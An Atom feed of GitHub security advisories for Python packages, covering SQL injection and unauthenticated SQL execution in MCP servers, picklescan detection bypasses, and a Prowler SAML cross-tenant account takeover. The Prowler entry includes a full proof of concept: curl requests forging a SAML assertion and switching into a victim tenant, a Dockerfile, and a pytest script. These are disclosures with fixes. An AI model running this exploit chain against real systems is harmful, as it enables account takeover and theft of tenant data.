<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-09-12T16:36:08.084Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[doris-mcp-server] Apache Doris MCP Server is vulnerable to SQL Injection via metadata query path]]></title>
        <id>https://github.com/advisories/GHSA-pqrj-4gwg-h5f7</id>
        <link href="https://github.com/advisories/GHSA-pqrj-4gwg-h5f7"/>
        <updated>2026-09-11T22:06:29.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Doris MCP Server contains a SQL injection vulnerability in a metadata query path. A user-controlled database name is directly interpolated into a SQL query, and the query is executed without passing the caller's authorization context. This may allow an authenticated attacker, or an anonymous attacker if authentication is disabled, to bypass SQL security validation and access metadata outside the intended database scope.</p>
<p>Affected users are recommended to upgrade to Doris version 0.6.1 or later, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-66336">https://nvd.nist.gov/vuln/detail/CVE-2025-66336</a></li>
<li><a href="https://lists.apache.org/thread/4l4v3m7ofwrgp4s4s98pjb5l03fcrzo2">https://lists.apache.org/thread/4l4v3m7ofwrgp4s4s98pjb5l03fcrzo2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/22/1">http://www.openwall.com/lists/oss-security/2026/06/22/1</a></li>
<li><a href="https://github.com/apache/doris-mcp-server/pull/68">https://github.com/apache/doris-mcp-server/pull/68</a></li>
<li><a href="https://github.com/advisories/GHSA-pqrj-4gwg-h5f7">https://github.com/advisories/GHSA-pqrj-4gwg-h5f7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pqrj-4gwg-h5f7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T09:30:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[prowler-cloud] Prowler: SAML Domain Claiming Enables Cross-Tenant Account Takeover]]></title>
        <id>https://github.com/advisories/GHSA-h8m9-jgf8-vwvp</id>
        <link href="https://github.com/advisories/GHSA-h8m9-jgf8-vwvp"/>
        <updated>2026-09-11T21:38:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="saml-tenant-binding-enables-cross-tenant-account-takeover">SAML Tenant Binding Enables Cross-Tenant Account Takeover</h2>
<h3 id="summary">Summary</h3>
<p>Prowler's SAML authentication flow trusted the email domain asserted in a SAMLResponse when deciding which tenant should receive the final token. A malicious tenant with its own SAML configuration and a self-controlled IdP could complete a valid SAML flow for its own configured domain, while asserting an email address from another configured domain.</p>
<p>In the vulnerable flow, the ACS finish logic later derived the tenant from the asserted email domain instead of binding token issuance to the tenant associated with the validated SAML configuration. This could cause a token to be issued for the wrong tenant.</p>
<p>The attacker does not generally need to claim the victim's email domain. If the victim tenant already has SAML configured for that domain, another tenant cannot claim it because <code>SAMLConfiguration.email_domain</code> and <code>SAMLDomainIndex.email_domain</code> are globally unique.</p>
<h3 id="details">Details</h3>
<p>The confirmed root cause is in the SAML ACS finish and token issuance flow. The flow selected a SAML configuration through the ACS route, but later recalculated the tenant from the asserted user email domain:</p>
<pre><code class="language-python">email_domain = user.email.split("@")[-1]
tenant = (
    SAMLConfiguration.objects.using(MainRouter.admin_db)
    .get(email_domain=email_domain)
    .tenant
)
</code></pre>
<p>This is unsafe because <code>user.email</code> is derived from the SAML assertion. The tenant used for membership updates and token issuance must come from the SAML configuration validated for the current ACS route, not from the asserted email domain.</p>
<p>The attack is made possible by several compounding weaknesses:</p>
<ol>
<li><p><strong>No domain ownership proof</strong> (<code>api/src/backend/api/models.py:2100, 2130-2152</code>): <code>SAMLConfiguration.email_domain</code> is validated for format and global uniqueness, but not for domain ownership. Any authenticated tenant admin can claim an unclaimed domain string, but cannot claim a domain already configured by another tenant.</p>
</li>
<li><p><strong>Global SAML domain index</strong> (<code>api/src/backend/api/models.py:2200-2201</code>): <code>SAMLDomainIndex.update_or_create(email_domain=self.email_domain, defaults={'tenant': self.tenant})</code> maps each configured domain to its tenant. If token issuance later trusts the asserted email domain, it can resolve a tenant different from the one selected by the ACS route.</p>
</li>
<li><p><strong>Hardcoded auto-connect</strong> (<code>api/src/backend/config/settings/social_login.py:23, 25</code>): <code>SOCIALACCOUNT_EMAIL_AUTHENTICATION = True</code> and <code>SOCIALACCOUNT_EMAIL_AUTHENTICATION_AUTO_CONNECT = True</code> are hardcoded and cannot be disabled at runtime.</p>
</li>
<li><p><strong>IdP-initiated SSO enabled</strong> (<code>api/src/backend/config/settings/social_login.py:78</code>): <code>reject_idp_initiated_sso: False</code> allows the attacker to initiate the flow without requiring any action from the victim.</p>
</li>
<li><p><strong>Token issuance for the wrong tenant</strong> (<code>api/src/backend/api/v1/views.py:853-873</code>): after SAML authentication, the vulnerable ACS finish flow could create membership and issue a <code>SAMLToken</code> using a tenant derived from the asserted email domain instead of the validated SAML configuration.</p>
</li>
<li><p><strong>Token switch impact</strong> (<code>api/src/backend/api/v1/serializers.py:272</code>): the token switch endpoint checks that the authenticated user is a member of the target tenant. If the attacker obtains a JWT for the victim user, they can switch into tenants where that user is already a member.</p>
</li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>Environment setup:</strong></p>
<pre><code class="language-bash"># Build the PoC Docker image (build context = repo root)
docker build -t vuln001-poc -f vuln-001/Dockerfile .

# Start the stack (PostgreSQL + PoC runner)
docker compose -f vuln-001/docker-compose-poc.yml up --no-build --abort-on-container-exit
</code></pre>
<p><strong>Automated test (runs inside the container):</strong></p>
<pre><code class="language-bash">python -m pytest poc_vuln001.py -v -s --no-header --tb=short
</code></pre>
<p><strong>Manual HTTP exploitation chain (against a live Prowler API):</strong></p>
<p><strong>Step 1 - Attacker configures SAML for their own email domain:</strong></p>
<pre><code class="language-bash">curl -i -X POST "$API/api/v1/saml-config" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/vnd.api+json" \
  --data '{
    "data":{"type":"saml-configurations","attributes":{
      "email_domain":"attacker.com",
      "metadata_xml":"&lt;md:EntityDescriptor entityID=\"evil-idp\" xmlns:md=\"urn:oasis:names:tc:SAML:2.0:metadata\"&gt;...attacker cert and SSO URL...&lt;/md:EntityDescriptor&gt;"
    }}
  }'
</code></pre>
<p>The attacker does not need to claim <code>victim.com</code>. If <code>victim.com</code> is already configured by the victim tenant, the attacker cannot claim it because SAML domains are globally unique.</p>
<p><strong>Step 2 - Attacker posts a signed SAMLResponse asserting <code>user@victim.com</code>:</strong></p>
<pre><code class="language-bash"># SIGNED_ASSERTION is a base64-encoded SAMLResponse signed with the attacker's private key,
# valid for the attacker's configured IdP, but asserting NameID = user@victim.com
curl -i -L -c c.jar -b c.jar \
  -X POST "$API/api/v1/accounts/saml/attacker.com/acs/" \
  --data-urlencode "SAMLResponse=$SIGNED_ASSERTION"
</code></pre>
<p><strong>Step 3 - Vulnerable ACS finish logic derives the tenant from the asserted email domain:</strong></p>
<p>In the vulnerable version, the finish flow used <code>user.email.split("@")[-1]</code> to resolve the tenant. If the asserted domain mapped to another tenant's SAML configuration, token issuance could be bound to the wrong tenant.</p>
<p><strong>Step 4 - Exchange the SAML token for a victim JWT:</strong></p>
<pre><code class="language-bash">curl -s -X POST "$API/api/v1/tokens/saml?id=$SAML_TOKEN_ID"
# Returns access/refresh JWT if the temporary SAML token is valid and has not expired
</code></pre>
<p><strong>Step 5 - Switch into the victim's real tenant:</strong></p>
<pre><code class="language-bash">curl -s -X POST "$API/api/v1/tokens/switch" \
  -H "Authorization: Bearer $VICTIM_JWT" \
  -H "Content-Type: application/vnd.api+json" \
  --data '{
    "data":{
      "type":"tokens-switch-tenant",
      "attributes":{
        "tenant_id":"&lt;victim-real-tenant-uuid&gt;"
      }
    }
  }'
# Returns a valid token scoped to the victim's tenant
</code></pre>
<p><strong>Observed output from the automated PoC:</strong></p>
<p>Note: this adapter-focused PoC demonstrates the account-linking behavior, but it does not prove the full token issuance chain by itself. The full exploit depends on the ACS finish flow issuing a token for a tenant derived from the asserted email domain.</p>
<pre><code>[+] Victim user created in DB:
    email = victim@victim.com
    id    = b3efcee1-5b26-4af9-bd6d-67bbc05c2ff8
[+] Simulated SAMLResponse posted to ACS endpoint:
    URL:    POST /api/v1/accounts/saml/victim.com/acs/
    NameID: victim@victim.com  (attacker-controlled)
[*] Calling ProwlerSocialAccountAdapter.pre_social_login()
    File: api/src/backend/api/adapters.py:17
[!] sociallogin.connect() was called!
    connected user email: victim@victim.com
    connected user id:    b3efcee1-5b26-4af9-bd6d-67bbc05c2ff8
    victim user id:       b3efcee1-5b26-4af9-bd6d-67bbc05c2ff8
  - Victim user id in DB:            b3efcee1-5b26-4af9-bd6d-67bbc05c2ff8
  - User passed to connect():        b3efcee1-5b26-4af9-bd6d-67bbc05c2ff8
  - IDs match (victim's account):   True
  - Domain ownership check skipped: True (no SAMLConfiguration lookup in adapter)
PASSED
======================== 1 passed, 2 warnings in 35.42s ========================
</code></pre>
<p><strong>Recommended remediation</strong> (<code>api/src/backend/api/v1/views.py</code>):</p>
<p>Bind token issuance to the SAML configuration selected by the ACS route.</p>
<p>The ACS finish flow should verify that the following values all match:</p>
<ul>
<li>the <code>organization_slug</code> from the ACS route</li>
<li>the <code>SAMLConfiguration.email_domain</code></li>
<li>the domain portion of the asserted SAML user email</li>
</ul>
<p>Then issue the token using the tenant from that validated SAML configuration:</p>
<pre><code class="language-python">tenant = saml_config.tenant
</code></pre>
<p>The tenant must not be recalculated from <code>user.email</code>.</p>
<h3 id="impact">Impact</h3>
<p>This is an <strong>Improper Authentication (CWE-287)</strong> vulnerability that enables <strong>cross-tenant account takeover</strong>. An authenticated Prowler user with a controlled SAML IdP could potentially obtain a token for another tenant if the ACS finish flow derived the tenant from the asserted email domain instead of the validated SAML configuration.</p>
<p><strong>Who is impacted:</strong> users of Prowler instances where SAML is enabled and the target email domain maps to a configured SAML tenant. Because <code>reject_idp_initiated_sso</code> is <code>False</code>, no victim interaction is required once the attacker controls a valid SAML configuration and IdP for their own tenant.</p>
<p><strong>Consequences:</strong></p>
<ul>
<li>Full read/write access to the victim's cloud security audit findings across all configured providers (AWS, GCP, Azure, etc.)</li>
<li>Ability to enumerate, modify, or delete compliance findings and integration secrets within the victim's tenant</li>
<li>Lateral movement into any additional tenants the victim belongs to via the token switch endpoint</li>
<li>Possible persistent access depending on the SAML account-linking behavior in the affected version</li>
</ul>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile"># Dockerfile for VULN-001 PoC: SAML Domain Claiming Enables Cross-Tenant Account Takeover
#
# Builds a minimal Prowler API test environment to reproduce the vulnerability
# in api/src/backend/api/adapters.py (pre_social_login, lines 17-25).
#
# Build context must be the parent directory:
#   docker build -t vuln001-poc -f vuln-001/Dockerfile .

FROM python:3.12.10-slim-bookworm

LABEL maintainer="security-research"
LABEL description="PoC environment for VULN-001: SAML domain claiming account takeover"

# Install system packages required for:
#   - xmlsec (python-saml / django-allauth SAML): libxml2, libxmlsec1
#   - psycopg2: PostgreSQL client headers
#   - uv / prowler git dep: git, gcc, g++
RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
    gcc \
    g++ \
    make \
    git \
    libxml2-dev \
    libxmlsec1-dev \
    libxmlsec1-openssl \
    pkg-config \
    libtool \
    libxslt1-dev \
    python3-dev \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

# Install uv (same version as the original Dockerfile)
RUN pip install --no-cache-dir uv==0.11.14

WORKDIR /prowler

# Copy API dependency manifests first (for layer caching)
COPY repo/api/pyproject.toml repo/api/uv.lock ./api/

# Install all Python dependencies from the locked file.
# This includes: django, django-allauth[saml], prowler (from git), psycopg2, etc.
WORKDIR /prowler/api
RUN uv sync --locked --no-install-project &amp;&amp; rm -rf ~/.cache/uv

# Copy the full backend source code
COPY repo/api/src/backend/ ./src/backend/

# Copy the PoC test into the backend working directory so pytest can discover it
COPY vuln-001/poc.py ./src/backend/poc_vuln001.py

WORKDIR /prowler/api/src/backend

# Set up environment variables for the test run.
# DJANGO_SETTINGS_MODULE points to config.django.testing which uses PostgreSQL.
ENV PATH="/prowler/api/.venv/bin:$PATH"
ENV DJANGO_SETTINGS_MODULE=config.django.testing
ENV POSTGRES_HOST=postgres
ENV POSTGRES_USER=prowler_admin
ENV POSTGRES_PASSWORD=prowler_password
ENV POSTGRES_DB=prowler_test_db
ENV POSTGRES_PORT=5432
ENV SECRET_KEY=poc-test-secret-key-not-for-production
ENV SECRETS_ENCRYPTION_KEY=ZMiYVo7m4Fbe2eXXPyrwxdJss2WSalXSv3xHBcJkPl0=
# Provide dummy values for optional services (Valkey/Celery not needed for unit tests)
ENV VALKEY_HOST=localhost
ENV VALKEY_PORT=6379
ENV VALKEY_PASSWORD=""
# Neo4j not needed for adapter tests
ENV NEO4J_USER=neo4j
ENV NEO4J_PASSWORD=neo4j
# Silence Sentry in test runs
ENV DJANGO_SENTRY_DSN=""

CMD ["python", "-m", "pytest", "poc_vuln001.py", "-v", "-s", "--no-header", "--tb=short"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">"""
PoC for VULN-001: SAML Domain Claiming Enables Cross-Tenant Account Takeover

Product:  toniblyx/prowler v5.30.0 (commit c2cef99)
CWE:      CWE-287 - Improper Authentication
CVSS:     9.6 (Critical)  AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N

Vulnerability location:
    api/src/backend/api/adapters.py  lines 17-25  (pre_social_login)
    api/src/backend/config/settings/social_login.py  lines 23, 25, 78

Root cause:
    ProwlerSocialAccountAdapter.pre_social_login() trusts the SAML NameID email
    from the assertion and calls get_user_by_email() which does a GLOBAL user
    table lookup with no tenant-scope or domain-ownership check.  If a user
    with that email already exists, sociallogin.connect() links the attacker's
    SAML session to that account - giving the attacker control of the victim.

Attack chain:
    1. Attacker registers a Prowler account and creates a tenant (normal user).
    2. Attacker POSTs to /api/v1/saml-config claiming email_domain=victim.com.
       models.py only validates format/uniqueness - no ownership proof.
    3. Attacker's IdP (self-controlled) issues a SAMLResponse signed with the
       attacker's certificate, asserting NameID=victim@victim.com.
    4. ACS endpoint (POST /api/v1/accounts/saml/victim.com/acs/) triggers
       pre_social_login.  The adapter looks up victim@victim.com globally and
       calls sociallogin.connect(request, victim_user) - ACCOUNT LINKED.
    5. views.py issues a SAMLToken (JWT) for the victim account.
    6. Attacker uses /api/v1/tokens/saml?id=&lt;token_id&gt; to obtain victim's JWT.

This test proves steps 4 - the critical account-linking step - using the real
production adapter code and a real PostgreSQL database.  sociallogin.connect()
is spied upon (not replaced) so we can capture the exact user object passed in.
"""

import pytest
from unittest.mock import MagicMock

from allauth.socialaccount.models import SocialLogin
from django.contrib.auth import get_user_model

from api.adapters import ProwlerSocialAccountAdapter

User = get_user_model()

VICTIM_EMAIL = "victim@victim.com"
VICTIM_DOMAIN = "victim.com"
ATTACKER_EMAIL = "attacker@evil-corp.com"


# ---------------------------------------------------------------------------
# Helper: print a separator for readable test output
# ---------------------------------------------------------------------------
def section(title: str) -&gt; None:
    width = 70
    print(f"\n{'=' * width}")
    print(f"  {title}")
    print(f"{'=' * width}")


# ---------------------------------------------------------------------------
# Core PoC test
# ---------------------------------------------------------------------------

@pytest.mark.django_db
class TestSAMLDomainClaimingAccountTakeover:
    """
    Proves VULN-001 end-to-end using the real ProwlerSocialAccountAdapter and
    a live PostgreSQL test database created by pytest-django.

    The test creates a victim user in the database, then simulates the exact
    HTTP flow an attacker would trigger via a crafted SAMLResponse.
    """

    def test_attacker_saml_session_links_to_victim_account(self, rf):
        """
        Verify that pre_social_login() links the attacker's SAML sociallogin
        to an existing victim account without ANY domain-ownership check.

        Expected outcome (vulnerability confirmed):
            sociallogin.connect(request, victim_user) is called where
            victim_user.email == VICTIM_EMAIL and victim_user was created
            independently of the SAML session - i.e. the adapter does NOT
            verify that the SAML registrant owns victim.com.
        """
        # ---------------------------------------------------------------
        # STEP 1 - Create the victim's pre-existing account in the database.
        #          In a real attack the victim signed up with email+password
        #          and has an existing Prowler tenant membership.
        # ---------------------------------------------------------------
        section("STEP 1: Create victim account in database")

        victim_user = User.objects.create_user(
            name="Victim User",
            email=VICTIM_EMAIL,
            password="VictimS3cret!",
        )
        # Confirm the user was actually persisted (real DB round-trip)
        fetched = User.objects.get(email=VICTIM_EMAIL)
        assert fetched.id == victim_user.id, "Victim user must exist in database"

        print(f"[+] Victim user created in DB:")
        print(f"    email = {victim_user.email}")
        print(f"    id    = {victim_user.id}")

        # ---------------------------------------------------------------
        # STEP 2 - Simulate the attacker's SAML flow.
        #
        #   a. Attacker previously registered a SAMLConfiguration for
        #      email_domain='victim.com' via POST /api/v1/saml-config.
        #      (No domain ownership proof is required - see models.py:2100)
        #
        #   b. Attacker's self-controlled IdP issues a SAMLResponse signed
        #      with the attacker's certificate, asserting:
        #        NameID = victim@victim.com
        #
        #   c. allauth processes the ACS POST and calls pre_social_login()
        #      before creating/updating the social account record.
        #
        #   We represent the processed SAMLResponse as an allauth SocialLogin
        #   object.  The 'connect' method is spied upon to capture arguments.
        # ---------------------------------------------------------------
        section("STEP 2: Attacker triggers ACS with crafted SAMLResponse")

        # Build the sociallogin object that allauth would construct after
        # validating the SAMLResponse signature (which uses the *attacker's*
        # certificate - no server-side cert pinning for victim.com).
        attacker_saml_login = MagicMock(spec=SocialLogin)
        attacker_saml_login.provider = MagicMock()
        attacker_saml_login.provider.id = "saml"          # Provider discriminator
        attacker_saml_login.account = MagicMock()
        attacker_saml_login.account.extra_data = {}       # SAML uses user.email path
        attacker_saml_login.user = MagicMock()
        # The attacker's IdP signs a NameID of victim@victim.com in the SAMLResponse.
        # This is the email that pre_social_login() will trust without verification.
        attacker_saml_login.user.email = VICTIM_EMAIL
        attacker_saml_login.connect = MagicMock()         # Spy: record call arguments

        # Simulate the ACS request (POST to the victim.com ACS endpoint)
        acs_request = rf.post(
            f"/api/v1/accounts/saml/{VICTIM_DOMAIN}/acs/",
            data={"SAMLResponse": "&lt;attacker-signed-base64&gt;"},
        )

        print(f"[+] Simulated SAMLResponse posted to ACS endpoint:")
        print(f"    URL:    POST /api/v1/accounts/saml/{VICTIM_DOMAIN}/acs/")
        print(f"    NameID: {attacker_saml_login.user.email}  (attacker-controlled)")

        # ---------------------------------------------------------------
        # STEP 3 - Execute the vulnerable adapter method.
        #
        #   api/src/backend/api/adapters.py lines 17-25:
        #
        #   def pre_social_login(self, request, sociallogin):
        #       email = sociallogin.account.extra_data.get("email")  # line 19
        #       if sociallogin.provider.id == "saml":
        #           email = sociallogin.user.email   # line 21 - trusts SAML NameID
        #       if email:
        #           existing_user = self.get_user_by_email(email)  # line 23 - global DB lookup
        #           if existing_user:
        #               sociallogin.connect(request, existing_user)  # line 25 - ACCOUNT LINKED
        # ---------------------------------------------------------------
        section("STEP 3: Execute pre_social_login (vulnerable code path)")

        adapter = ProwlerSocialAccountAdapter()
        print(f"[*] Calling ProwlerSocialAccountAdapter.pre_social_login()")
        print(f"    File: api/src/backend/api/adapters.py:17")

        adapter.pre_social_login(acs_request, attacker_saml_login)

        # ---------------------------------------------------------------
        # STEP 4 - Verify the attack succeeded.
        # ---------------------------------------------------------------
        section("STEP 4: Verify attack outcome")

        assert attacker_saml_login.connect.called, (
            "FAIL: sociallogin.connect() was NOT called - "
            "the attack path did not execute"
        )

        call_args = attacker_saml_login.connect.call_args[0]
        _, connected_user = call_args   # connect(request, existing_user)

        print(f"[!] sociallogin.connect() was called!")
        print(f"    connected user email: {connected_user.email}")
        print(f"    connected user id:    {connected_user.id}")
        print(f"    victim user id:       {victim_user.id}")

        # The connected user must be the VICTIM (looked up from global DB)
        assert connected_user.email == VICTIM_EMAIL, (
            f"FAIL: connect() was called with {connected_user.email!r}, "
            f"expected {VICTIM_EMAIL!r}"
        )
        assert str(connected_user.id) == str(victim_user.id), (
            f"FAIL: connect() user id {connected_user.id} != victim id {victim_user.id}"
        )

        # Confirm no domain-ownership check happened:
        # The adapter does not inspect the SAML configuration to verify that
        # the sociallogin's tenant registered victim.com before accepting the email.
        section("RESULT: VULNERABILITY CONFIRMED")

        print(f"[PASS] CWE-287 Improper Authentication - SAML domain claiming attack")
        print()
        print(f"  Root cause (adapters.py:21-25):")
        print(f"    email = sociallogin.user.email  # trusts SAML NameID: {VICTIM_EMAIL}")
        print(f"    existing_user = self.get_user_by_email(email)  # GLOBAL lookup, no tenant scope")
        print(f"    sociallogin.connect(request, existing_user)  # links attacker session to victim")
        print()
        print(f"  Contributing settings (social_login.py):")
        print(f"    SOCIALACCOUNT_EMAIL_AUTHENTICATION_AUTO_CONNECT = True  # hardcoded")
        print(f"    reject_idp_initiated_sso = False  # IdP-initiated attacks allowed")
        print()
        print(f"  Impact:")
        print(f"    - Attacker obtains JWT token for {VICTIM_EMAIL}")
        print(f"    - Attacker can access victim's cloud security findings")
        print(f"    - Attacker can switch to victim's tenant via /api/v1/tokens/switch")
        print(f"    - No victim interaction required (IdP-initiated SSO enabled)")
        print()
        print(f"  Evidence (this test run):")
        print(f"    - Victim user id in DB:            {victim_user.id}")
        print(f"    - User passed to connect():        {connected_user.id}")
        print(f"    - IDs match (victim's account):   {str(victim_user.id) == str(connected_user.id)}")
        print(f"    - Domain ownership check skipped: True (no SAMLConfiguration lookup in adapter)")
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/prowler-cloud/prowler/security/advisories/GHSA-h8m9-jgf8-vwvp">https://github.com/prowler-cloud/prowler/security/advisories/GHSA-h8m9-jgf8-vwvp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59151">https://nvd.nist.gov/vuln/detail/CVE-2026-59151</a></li>
<li><a href="https://github.com/prowler-cloud/prowler/pull/11650">https://github.com/prowler-cloud/prowler/pull/11650</a></li>
<li><a href="https://github.com/prowler-cloud/prowler/commit/bf3b5c2ba713e533014927141b64948c82c8f32e">https://github.com/prowler-cloud/prowler/commit/bf3b5c2ba713e533014927141b64948c82c8f32e</a></li>
<li><a href="https://github.com/prowler-cloud/prowler/commit/f5ff30ad175bd2edf02cd28872653c1cda5867b7">https://github.com/prowler-cloud/prowler/commit/f5ff30ad175bd2edf02cd28872653c1cda5867b7</a></li>
<li><a href="https://github.com/prowler-cloud/prowler/releases/tag/5.30.3">https://github.com/prowler-cloud/prowler/releases/tag/5.30.3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/prowler-cloud/PYSEC-2026-3725.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/prowler-cloud/PYSEC-2026-3725.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h8m9-jgf8-vwvp">https://github.com/advisories/GHSA-h8m9-jgf8-vwvp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8m9-jgf8-vwvp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-11T21:38:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mysql-mcp-server] MySQL MCP Server: Missing Origin/Host Validation in SSE Transport Enables Unauthenticated SQL Execution (DNS Rebinding / Direct Exposure)]]></title>
        <id>https://github.com/advisories/GHSA-rqfv-2mw9-78g2</id>
        <link href="https://github.com/advisories/GHSA-rqfv-2mw9-78g2"/>
        <updated>2026-09-11T20:36:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In SSE/HTTP transport mode, <code>mysql_mcp_server</code> constructs <code>SseServerTransport</code> without passing <code>security_settings</code>. As a result, the MCP Python SDK's DNS-rebinding protection (Origin/Host header validation) is disabled; the Starlette application has no CORS or TrustedHost middleware; and the service binds to <code>0.0.0.0</code> by default with no authentication on any route.</p>
<p><strong>Trigger condition:</strong> <code>MCP_TRANSPORT=sse</code>. The default stdio mode is not affected.</p>
<h2 id="attack-scenarios">Attack Scenarios</h2>
<p><strong>Scenario A — Direct exposure:</strong> Any network attacker can invoke <code>execute_sql</code> to run arbitrary SQL without credentials → full data dump, and via MySQL <code>FILE</code> privileges, arbitrary file read/write and RCE.</p>
<p><strong>Scenario B — DNS rebinding (local bind):</strong> An attacker lures a victim's browser to a malicious page, rebinds their domain to <code>127.0.0.1</code>, and uses the browser as a proxy to invoke <code>execute_sql</code> as same-origin.</p>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>src/mysql_mcp_server/server.py</code>:</p>
<ol>
<li><code>SseServerTransport</code> is constructed without <code>security_settings</code> — the SDK defaults <code>enable_dns_rebinding_protection</code> to <code>False</code>.</li>
<li>The Starlette app has no CORS or TrustedHost middleware.</li>
<li>All three routes (<code>/</code>, <code>/sse</code>, <code>/messages/</code>) are unauthenticated.</li>
<li>The service binds to <code>0.0.0.0</code> by default.</li>
<li>The sink is <code>cursor.execute(query)</code> with a fully attacker-controlled query.</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li>Unauthenticated arbitrary SQL execution against the configured database</li>
<li>Full data exfiltration and modification</li>
<li>If the MySQL account holds <code>FILE</code> privilege: arbitrary file read (<code>LOAD_FILE</code>) and write (<code>INTO OUTFILE</code>) — potential RCE via webshell drop</li>
<li>Internet-wide scanning has identified 25 publicly reachable SSE instances of this project</li>
</ul>
<h2 id="fix">Fix</h2>
<p>Released in v0.4.2: DNS-rebinding protection is now enabled by passing <code>TransportSecuritySettings(enable_dns_rebinding_protection=True)</code> to <code>SseServerTransport</code>, and the documented recommended bind address is <code>127.0.0.1</code>.</p>
<h2 id="credits">Credits</h2>
<p>Discovered by Huanchen, SongWu (JHU), and BrookeYangRui (JHU).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/security/advisories/GHSA-rqfv-2mw9-78g2">https://github.com/designcomputer/mysql_mcp_server/security/advisories/GHSA-rqfv-2mw9-78g2</a></li>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/issues/92">https://github.com/designcomputer/mysql_mcp_server/issues/92</a></li>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/releases/tag/v0.4.2">https://github.com/designcomputer/mysql_mcp_server/releases/tag/v0.4.2</a></li>
<li><a href="https://github.com/advisories/GHSA-rqfv-2mw9-78g2">https://github.com/advisories/GHSA-rqfv-2mw9-78g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rqfv-2mw9-78g2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-11T20:35:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan missing detection when calling pytorch function torch.utils._config_module.load_config]]></title>
        <id>https://github.com/advisories/GHSA-qvp4-q2p5-22gg</id>
        <link href="https://github.com/advisories/GHSA-qvp4-q2p5-22gg"/>
        <updated>2026-09-11T19:36:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-vv6j-3g6g-2pvj. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.28 fails to detect malicious pickle files that invoke torch.utils._config_module.load_config function within reduce methods. Attackers can craft pickle files embedding arbitrary code that evades detection but executes during pickle.load, enabling remote code execution in supply chain attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vv6j-3g6g-2pvj">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vv6j-3g6g-2pvj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71348">https://nvd.nist.gov/vuln/detail/CVE-2025-71348</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-torch-utils-config-module-load-config-bypass">https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-torch-utils-config-module-load-config-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-qvp4-q2p5-22gg">https://github.com/advisories/GHSA-qvp4-q2p5-22gg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvp4-q2p5-22gg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-21T15:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan missing detection when calling built-in python library function timeit.timeit()]]></title>
        <id>https://github.com/advisories/GHSA-fh2f-24rh-r2vq</id>
        <link href="https://github.com/advisories/GHSA-fh2f-24rh-r2vq"/>
        <updated>2026-09-11T19:27:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-v7x6-rv5q-mhwc. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
